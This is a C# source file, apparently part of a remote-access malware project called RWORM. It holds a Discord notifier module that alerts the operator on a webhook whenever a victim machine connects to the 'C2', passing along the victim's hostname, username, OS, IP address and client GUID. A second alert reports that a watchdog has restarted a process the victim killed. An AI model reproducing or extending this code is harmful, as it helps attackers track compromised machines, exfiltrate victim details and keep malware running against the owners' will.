using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public static class DiscordNotifier
    {
        private const string WebhookThumbnailUrl = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/GUI/Resources/Assets/rwm3.png";
        private const string WebhookEveryone = "@everyone";

        private static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };

        private static async Task<System.Net.Http.HttpResponseMessage> PostWithRetryAsync(string webhookUrl, string json)
        {
            using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
            var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
            for (int attempt = 0; attempt < 3; attempt++)
            {
                var response = await client.PostAsync(webhookUrl, content).ConfigureAwait(false);
                if ((int)response.StatusCode == 429)
                {
                    var wait = TimeSpan.FromSeconds(1);
                    try
                    {
                        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                        using var doc = System.Text.Json.JsonDocument.Parse(body);
                        if (doc.RootElement.TryGetProperty("retry_after", out var retryEl) && retryEl.ValueKind == System.Text.Json.JsonValueKind.Number)
                            wait = TimeSpan.FromSeconds(retryEl.GetDouble());
                    }
                    catch { }
                    if (wait > TimeSpan.FromSeconds(3)) wait = TimeSpan.FromSeconds(3);
                    await Task.Delay((int)wait.TotalSeconds * 1000 + 250).ConfigureAwait(false);
                    continue;
                }
                return response;
            }
            return new System.Net.Http.HttpResponseMessage(System.Net.HttpStatusCode.InternalServerError);
        }

        private static string EscapeJson(string? s)
        {
            if (s == null) return "";
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"':  sb.Append("\\\""); break;
                    case '\b': sb.Append("\\b");  break;
                    case '\f': sb.Append("\\f");  break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < ' ')
                            sb.AppendFormat("\\u{0:x4}", (int)c);
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        public static async Task SendConnectAlertAsync(
            string webhookUrl,
            string hostname,
            string username,
            string os,
            string ip,
            string guid)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var h = EscapeJson(hostname);
                var u = EscapeJson(username);
                var o = EscapeJson(os);
                var i = EscapeJson(string.IsNullOrWhiteSpace(ip) ? "Unknown" : ip);
                var g = EscapeJson(guid);

                var json = $"{{\"username\":\"RWorm BITA\",\"avatar_url\":\"https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true\",\"content\":\"{WebhookEveryone}\",\"embeds\":[{{\"title\":\"<:checkmark:1569394022932422656> New Client Connected to C2\",\"description\":\"**Host:** <:pc:1569394483114541056>`{h}`\\n**User:** <:client:1569397753006530701>`{u}`\",\"color\":12849673,\"thumbnail\":{{\"url\":\"{WebhookThumbnailUrl}\"}},\"fields\":[{{\"name\":\"IP Address\",\"value\":\"{i}\",\"inline\":true}},{{\"name\":\"<:windows:1569394768310706278> OS Version\",\"value\":\"{o}\",\"inline\":true}},{{\"name\":\"Client GUID\",\"value\":\"`{g}`\",\"inline\":false}}],\"footer\":{{\"text\":\"RWorm Build In Task Alerts\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";

                _ = await PostWithRetryAsync(webhookUrl, json).ConfigureAwait(false);
            }
            catch
            {
                // Non-blocking fail-safe
            }
        }

        public static async Task SendReviveAlertAsync(string webhookUrl, string targetExe)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var exe = EscapeJson(targetExe);
                var host = EscapeJson(Environment.MachineName);
                var user = EscapeJson(Environment.UserName);

                var json = $"{{\"username\":\"RWorm BITA\",\"avatar_url\":\"https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true\",\"content\":\"{WebhookEveryone}\",\"embeds\":[{{\"title\":\"<:shield1:1569401973957201951> Anti-Kill Alert\",\"description\":\"⚠️ **Target process was killed!**\\nBackup watchdog successfully revived: `{exe}`\",\"color\":16728128,\"thumbnail\":{{\"url\":\"{WebhookThumbnailUrl}\"}},\"fields\":[{{\"name\":\"<:pc:1569394483114541056> Host\",\"value\":\"{host}\",\"inline\":true}},{{\"name\":\"<:client:1569397753006530701> User\",\"value\":\"{user}\",\"inline\":true}}],\"footer\":{{\"text\":\"RWorm Build In Task Alerts\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";

                _ = await PostWithRetryAsync(webhookUrl, json).ConfigureAwait(false);
            }
            catch
            {
                
            }
        }
    }
}
